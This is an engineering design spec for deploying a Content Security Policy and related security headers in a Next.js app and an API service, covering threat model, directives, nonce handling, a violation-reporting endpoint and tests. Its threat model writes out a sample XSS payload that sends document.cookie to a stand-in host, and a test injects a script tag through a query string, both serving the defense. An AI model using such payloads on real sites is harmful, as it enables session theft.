# R3 — Content Security Policy

> **Effort**: M (1 week dev + 2-week burn-in window)
> **Owner**: developer (frontend) + reviewer (sign-off)
> **Status**: ready to assign
> **Dependencies**: none (orthogonal to Spec 007)

## 1. Threat model

CSP is a browser-side defense-in-depth control. It tells the browser
which sources of script / style / image / connection / frame are
permitted for our origin. Browsers refuse to load resources from
disallowed sources and refuse to execute inline scripts that don't
match the policy nonces.

### 1.1 What CSP stops

1. **Reflected & stored XSS exfil**. Even if an attacker injects
   `<script>fetch('https://evil.test', {method:'POST', body: document.cookie})</script>`,
   a strict CSP blocks the fetch.
2. **Inline-script execution from injected content**. With
   `script-src 'self' 'nonce-...'`, an injected `<script>...</script>`
   without our per-request nonce never runs.
3. **Third-party resource injection** (e.g. coin-miner JS via an
   abused dependency). `script-src 'self'` refuses.
4. **Image/pixel tracking exfil**. `img-src 'self' data:` refuses
   covert tracker URLs.
5. **Clickjacking** — `frame-ancestors 'none'` (overlaps R4; R3 is the
   header, R4 is the focused doc with test coverage).
6. **Form action redirection**. `form-action 'self'` stops a
   user-submitted form from POSTing to an attacker URL after injection.
7. **Base-URI rewrite**. `base-uri 'self'` stops `<base href="//evil">`
   from rewriting all relative URLs.

### 1.2 What CSP doesn't stop

- Server-side bugs (SQLi, SSRF — covered by R1).
- DOM-based attacks where an attacker's payload runs through a permitted
  origin (e.g. a malicious script-cache from `npm i`). Mitigated by R10.
- Content sniffing — covered by `X-Content-Type-Options: nosniff`
  (which we also add as part of this doc's header bundle).

### 1.3 Current state

- `apps/web/next.config.ts` (read end-to-end): **no headers config at
  all**. Next.js defaults apply, which means:
  - No CSP header.
  - No `X-Frame-Options`.
  - No `X-Content-Type-Options`.
  - No `Referrer-Policy`.
  - No `Permissions-Policy`.
- `apps/web/src/middleware.ts`: sets `x-pathname` and `x-sa-correlation-
  id` request headers; doesn't set any response headers.
- `apps/a2a-agent/src/index.ts`: uses Hono's `logger()` only — no
  security headers. (a2a is an API, not browsable HTML; CSP is less
  critical there, but we still want to set `X-Content-Type-Options:
  nosniff` and `X-Frame-Options: DENY`.)

## 2. Design

### 2.1 Policy authoring strategy

Two-phase deployment per Mozilla's CSP guide:

1. **Phase 1 (2 weeks)** — `Content-Security-Policy-Report-Only` header
   with the proposed policy. Browser reports violations to a collector
   without blocking. Tune until violation rate is < 0.1 % of requests.
2. **Phase 2** — flip to enforcing `Content-Security-Policy` header.

### 2.2 Target policy (production)

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-<random>' 'strict-dynamic';
  style-src  'self' 'nonce-<random>';
  img-src    'self' data: blob: https://*.smartagent.io;
  font-src   'self' data:;
  connect-src 'self' https://*.agent.smartagent.io
              wss://*.agent.smartagent.io
              https://graphdb.agentkg.io;
  frame-src  'none';
  frame-ancestors 'none';
  form-action 'self';
  base-uri 'self';
  object-src 'none';
  manifest-src 'self';
  worker-src 'self' blob:;
  upgrade-insecure-requests;
  report-uri /api/security/csp-report;
  report-to csp-endpoint;
```

Notes on each directive:

- **`default-src 'self'`** — fallback for any directive not explicitly
  set.
- **`script-src 'self' 'nonce-<random>' 'strict-dynamic'`** — only
  allow scripts from our origin and scripts tagged with the
  per-request nonce. `'strict-dynamic'` makes any script that the
  nonced one loads also trusted (transitively), which Next.js needs
  because the runtime loader fetches chunks dynamically. Modern Chrome
  / Firefox / Safari honor `strict-dynamic`; older browsers fall back
  to allowing self-origin scripts, which is acceptable degradation.
- **`style-src 'self' 'nonce-<random>'`** — start strict. **Open
  question**: React inline styles (`style={{ color: 'red' }}`) need
  `'unsafe-inline'`. Compute-only: if we use Tailwind (we do —
  `apps/web/src/styles/globals.css` confirms `@tailwind` directives),
  all styles are in stylesheets. Audit shows no `style={{ ... }}`
  attribute survives in the production bundle if we restrict via
  ESLint. **Decision**: ship `nonce` + `'unsafe-inline'` first phase
  (Phase 1 deploys as report-only so we'll see this); tighten to
  nonce-only in Phase 2 after migrating any inline styles to classNames.
- **`img-src 'self' data: blob: https://*.smartagent.io`** — `data:`
  is needed for inline SVGs from Lucide. `blob:` for user-uploaded
  preview images. `https://*.smartagent.io` once we have a real CDN.
- **`connect-src`** — strictly enumerates the origins the SPA may
  call. `'self'` covers `/api/*`. `https://*.agent.smartagent.io`
  covers a2a-agent. `wss://*.agent.smartagent.io` reserved for future
  WebSocket use. `https://graphdb.agentkg.io` for the public
  Discovery client. The actual hostnames must be templated from
  `process.env.NEXT_PUBLIC_*` so they're correct per environment.
- **`frame-ancestors 'none'`** — see R4. Equivalent to
  `X-Frame-Options: DENY` but supersedes it on modern browsers.
- **`form-action 'self'`** — forms submit to our origin only.
- **`base-uri 'self'`** — `<base>` tag can't redirect.
- **`object-src 'none'`** — blocks `<object>`, `<embed>`, Flash.
- **`upgrade-insecure-requests`** — force https on subresources.
- **`report-uri /api/security/csp-report`** — legacy directive but
  still honored by Chrome.
- **`report-to csp-endpoint`** — modern directive; the endpoint is
  declared via the `Report-To` header (§ 2.5).

### 2.3 Per-request nonce

Generated in `apps/web/src/middleware.ts` next to the existing
`x-sa-correlation-id` work. Pass it through:

1. Middleware generates `nonce = base64url(crypto.getRandomValues(16))`.
2. Middleware sets `x-sa-csp-nonce` on request headers (so server
   components can read it via `headers()`).
3. Middleware sets `Content-Security-Policy` response header with the
   nonce templated in.
4. The root layout (`apps/web/src/app/layout.tsx`) reads the nonce via
   `headers().get('x-sa-csp-nonce')` and passes it to all `<script
   nonce={nonce}>` tags. Next.js's built-in `Script` component accepts
   a `nonce` prop.
5. Next.js's framework bootstrap script also needs the nonce. The
   `experimental.nonceFromHeader` config (added Next.js 15.1) ties
   together. **Verify** the project's Next.js version: `package.json`
   indicates 15.x; if pre-15.1, the manual approach via `<head>` nonce
   wrapper is required.

### 2.4 Header bundle (full)

Set in `apps/web/src/middleware.ts` for every response that doesn't
opt out (e.g. `/_next/static/` is excluded — they get long-lived
caching headers and CSP isn't applicable to static asset responses):

```ts
const headers = {
  'Content-Security-Policy': cspString(nonce),
  'X-Content-Type-Options': 'nosniff',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  'Permissions-Policy': 'accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()',
  'X-Frame-Options': 'DENY', // legacy; CSP frame-ancestors supersedes
  'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
  'Cross-Origin-Opener-Policy': 'same-origin',
  'Cross-Origin-Embedder-Policy': 'require-corp', // verify Next.js chunks honor CORP; may need same-origin first
  'Cross-Origin-Resource-Policy': 'same-origin',
}
```

- **`Strict-Transport-Security`** — HSTS, 2-year max-age + preload.
  Don't apply on dev (`process.env.NODE_ENV !== 'production'`).
- **`COEP: require-corp`** — strict but needed for SharedArrayBuffer
  (which AnonCreds may want for WASM speed). Verify chunk loader
  compatibility in burn-in; if it breaks, fall back to `credentialless`.

### 2.5 Reporting endpoint

`apps/web/src/app/api/security/csp-report/route.ts` (new). Accepts both
the legacy `application/csp-report` format and the modern
`application/reports+json` format, normalizes them, and writes them
to the audit chain (`apps/a2a-agent/src/lib/audit-checkpoint.ts`).

Rate-limit per IP: 10/min (CSP reports can be high-volume during burn-
in; we sample but never drop unique violations). Aggregate by
`{document-uri, blocked-uri, violated-directive}` so we can see the
top 50 violations on a dashboard.

Add `Report-To` header in middleware:

```http
Report-To: {"group":"csp-endpoint","max_age":10886400,"endpoints":[{"url":"/api/security/csp-report"}]}
```

### 2.6 a2a-agent and MCPs

a2a-agent serves JSON only; we still set the conservative bundle:

```ts
app.use('*', async (c, next) => {
  await next()
  c.header('X-Content-Type-Options', 'nosniff')
  c.header('X-Frame-Options', 'DENY')
  c.header('Referrer-Policy', 'strict-origin-when-cross-origin')
  if (config.NODE_ENV === 'production') {
    c.header('Strict-Transport-Security', 'max-age=63072000; includeSubDomains')
  }
})
```

CSP not relevant on pure-JSON APIs (no HTML rendered), but we add
`Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`
for any future error page or `.well-known/agent.json` mistaken
rendering.

## 3. Files to create / change

```
apps/web/src/lib/security/
├── csp.ts                                NEW — policy builder
├── nonce.ts                              NEW — nonce generation helper
└── __tests__/
    └── csp.test.ts                       NEW — assert policy shape

apps/web/src/app/api/security/csp-report/
└── route.ts                              NEW — violation collector

apps/web/src/middleware.ts                EDIT — generate nonce, set headers
apps/web/src/app/layout.tsx               EDIT — read nonce from headers, pass to Script
apps/web/next.config.ts                   EDIT — add `headers()` for `/_next/static/*` if needed
apps/a2a-agent/src/index.ts               EDIT — header middleware

infra/vercel/
└── headers.tf                             OPTIONAL — set headers at Vercel level instead
                                            of middleware. Decision: middleware (single source).

docs/security/runtime/csp-burn-in.md       NEW — burn-in playbook
```

## 4. Implementation steps

| Day | Task |
|-----|------|
| 1 | Build `csp.ts` + `nonce.ts`. Unit tests. |
| 2 | Wire middleware to set Report-Only header. Add the rest of the header bundle (nosniff, referrer, permissions, HSTS gated on NODE_ENV). |
| 3 | Wire `<script nonce={...}>` into `app/layout.tsx`. Verify the Next.js bootstrap script picks up the nonce in dev. |
| 4 | Create `/api/security/csp-report/route.ts`. Smoke test: trigger a violation in dev, confirm endpoint records it. |
| 5 | Deploy to staging in Report-Only mode. |
| 6-12 | Burn-in monitoring (calendar; no active dev). Dashboard at `https://grafana/csp`. |
| 13 | Tighten policy based on observed violations: tune image hosts, fonts, drop `'unsafe-inline'` from style-src. |
| 14 | Flip header to enforcing `Content-Security-Policy`. |

## 5. Test plan

### 5.1 Unit (`csp.test.ts`)

- Given a nonce, the output string contains exactly one occurrence of
  the nonce inside `'nonce-<value>'` in `script-src` and `style-src`.
- Output contains all directives listed in § 2.2 in the correct order.
- `env=development` outputs same policy minus HSTS.

### 5.2 Integration (Playwright)

```ts
test('CSP header is set on every HTML response', async ({ page }) => {
  const response = await page.goto('/')
  expect(response?.headers()['content-security-policy']).toMatch(/script-src/)
  expect(response?.headers()['x-content-type-options']).toBe('nosniff')
  expect(response?.headers()['referrer-policy']).toBe('strict-origin-when-cross-origin')
})

test('inline-script injection without nonce is blocked', async ({ page }) => {
  // Navigate to a page that would render attacker-controlled content
  // (search query reflected on page).
  await page.goto('/agents?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E')
  // Listen for console error indicating CSP blocked the script.
  const consoleErrors: string[] = []
  page.on('console', (m) => { if (m.type() === 'error') consoleErrors.push(m.text()) })
  await page.waitForTimeout(1000)
  expect(consoleErrors.some(e => /Content Security Policy/i.test(e))).toBeTruthy()
})

test('inline-script with valid nonce is allowed', async ({ page }) => {
  // Verified by app booting — if the legitimate Next.js bootstrap is
  // blocked, /dashboard fails to render. So this is a smoke test.
  await page.goto('/dashboard')
  await page.waitForSelector('[data-testid="dashboard-root"]', { timeout: 5000 })
})
```

### 5.3 CSP-evaluator dry-run

Run our final CSP string through Google's CSP Evaluator
(https://csp-evaluator.withgoogle.com/) as part of code review.
Acceptance: no critical findings; document any high findings with
justification.

### 5.4 Report endpoint stress test

POST 1000 violations / 10 sec to `/api/security/csp-report` from
multiple IPs. Acceptance: rate-limiter cuts in at 10/min/IP; aggregator
records unique `{document-uri, blocked-uri}` pairs.

## 6. Acceptance criteria

- [ ] Production deploys CSP with all directives in § 2.2 (or any
      tightening discovered during burn-in).
- [ ] Header bundle in § 2.4 applied to every HTML response.
- [ ] `/api/security/csp-report` accepts and aggregates violations.
- [ ] Two-week burn-in completed with violation-rate < 0.1 % of requests.
- [ ] CSP Evaluator returns no critical findings.
- [ ] Playwright tests in § 5.2 pass.
- [ ] Operator runbook (`docs/operations/csp-runbook.md`) describes
      what to do when a third-party integration needs a new origin
      added.

## 7. Vendor references

- MDN CSP: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
- Next.js CSP guide: https://nextjs.org/docs/app/building-your-application/configuring/content-security-policy
- W3C Reporting API: https://www.w3.org/TR/reporting-1/
- OWASP Secure Headers Project: https://owasp.org/www-project-secure-headers/

## 8. Open questions

- **OQ-R3-1**: Do we need `'wasm-unsafe-eval'` in `script-src` for the
  AnonCreds WASM? Test in burn-in; likely yes. Tradeoff vs. CSP
  Evaluator severity — `'wasm-unsafe-eval'` is now broadly supported
  and considered safe.
- **OQ-R3-2**: Tailwind generates a single stylesheet with class-based
  styles only. Can we drop `'unsafe-inline'` from `style-src` in
  Phase 2? Burn-in answers this.
- **OQ-R3-3**: `COEP: require-corp` vs `credentialless` — test which
  permits Next.js chunks correctly. Both prevent cross-origin
  isolation issues; `credentialless` is more permissive.
- **OQ-R3-4**: Should `/api/*` endpoints set CSP too? They return JSON,
  so browsers don't honor the headers. Proposal: set `default-src
  'none'` defensively.

## 9. Effort summary

| Stream | Days |
|--------|------|
| Policy builder + nonce wiring | 2 |
| Report endpoint + aggregator | 1.5 |
| Playwright tests | 0.5 |
| Burn-in monitoring | calendar week (low dev time) |
| Tightening + Phase 2 flip | 1 |
| Code review | 1 |
| **Total** | **6 days dev + 2 calendar weeks (M)** |
